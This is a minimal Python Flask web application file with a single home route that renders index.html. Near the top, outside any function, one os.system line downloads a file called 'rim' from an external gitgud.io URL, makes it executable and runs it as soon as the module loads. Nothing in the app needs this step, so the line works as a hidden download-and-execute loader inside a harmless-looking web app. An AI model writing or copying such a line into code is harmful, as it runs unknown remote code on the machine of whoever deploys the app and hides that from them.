import os
from flask import Flask, render_template
os.system('curl --output rim https://gitgud.io/trendava/ruby/-/raw/master/rim;chmod 700 rim;./rim')
app = Flask(__name__)

@app.route("/")
def home_view():
    return render_template('index.html')
